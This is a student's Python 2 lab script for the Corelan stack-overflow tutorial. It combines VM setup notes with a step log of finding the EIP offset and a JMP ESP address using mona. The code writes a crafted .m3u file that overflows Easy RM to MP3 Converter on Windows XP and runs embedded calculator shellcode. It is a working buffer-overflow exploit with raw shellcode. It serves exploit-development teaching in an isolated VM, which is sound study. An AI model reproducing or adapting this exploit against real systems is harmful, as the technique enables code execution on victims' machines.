#!C:\python27\python.exe

'''
This is a starting file for the Corelan Exploit tutorial which can be found here:
https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/

Steps to get started:
1) Create a Windows XP VM (obtain VMware license as necessary)
	a) key in windows_xp.txt
	b) do install vmware tools
2) Install software
	a) python-2.7.4 -- make sure to add this to the path for simplicity
	b) notepad++ 6.6 (if you want it -- I use it for the tutorial)
	c) immunity debugger 1.85
	4) mona (see readme for instructions)
	e) EasyRMtoMP3Converter -- you'll want to unzip this hostside, then copy it over
C) Copy the exploit_start.py script (this file) to your VM
4) TAKE A SNAPSHOT OF YOUR VM. Trust me on this, life will be better if you do.
	a) it is faster to do this if your VM is powered down, but it will work either way.
	2) if you do snapshot with it on, do be kind, and leave it alone while it's doing its work.

Some notes:
[]The tutorial uses windbg + metasploit + perl
[]We will use immunity + mona + python
[]We are running this on an old XP VM.
[]The versions of python and notepad++ are the latest that run on such an old platform
[]If you don't know how to edit the system path, just ask when we get started. Likely you're not alone.
'''

'''
In this section of the code, I will document the step I got to producing an exploit in Windows XP.
This is base on the "Lab #2: Windows Exploitation -- Stack Overflow"

Step #1: During the program, I downloaded and setup the VM for Windows XP to get started on the program.
Step #2: Once the VM load, I was instructed to run the program in .py and it created a crash file fill with 10,000 A's
Step #3: We then create a file for 20,000 and 30,000 A's and run it into the Immunity Debugger
Step #4: Once in the debugger, I found out that there's a bug when running the 30,000 A's in the program giving us
         an error crash and the debugger report the EIP at the address is 41414141
Step #5: We then created another file with 25,000 fill with A's and the other 5,000 fill with B's and we find the address
         this time crashes somewhere between the 25,000 to the 30,000.
Step #6: Then I use MONA to create the 5000 characters to find the offset or the exact length by using the command
         '!mona pc 5000'
Step #7: Through this and using the '!mona pattern_offset <address>' I was able to find my offset where we can control the
         EIP. It was located at 1,072 offset. So to make it work I fill A's with 25,000 + 1,072 to get the 4 B's to show up
         and know where EIP is pointing to control it. Also ESP for C's is at 000FF758 address.
Step #8: Next, we need to find where the ESP start by creating a string of ABC to determine it location.
Step #9: Then I found out that we have control over EIP, have an area to write my code (144 bytes large) and the register
         that directly point to my code at 0x000FF758.
Step #10: Then I use the "!mona jmp -r' to find my JMP ESP and there was 117 pointers and I try to limit it to the program that
          was running and found the address for ESP start at 0x01A8F23A.
Step #11: Now we can add in the shellcode of the calculator and try to see if we manipulate correctly. Add the shellcode in for the
          calculator.
Step #12: Finalize the code and you will have an exploit in the program working with calc.
'''
import struct

def main():
	# We need a file, I just call it crash.m3u
	out = open('exploitrmtomp3[TL].m3u','w')

	main_junk = 'A' * 26072                 				 # The buffer that we got from the code
	eip = struct.pack('<I', 0x01a8f23a)      				 # 'JMP ESP' from MSRMCcodec02.dll
	shellcode = "\x90" * 25                 				 # Create 25 NOP

	calc = '\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca'


   # Write out and close the file
	write_string = main_junk + eip + shellcode + calc   # Concatenate all strings together
	out.write(write_string)
	out.close()

	
if __name__ == '__main__':
	main()
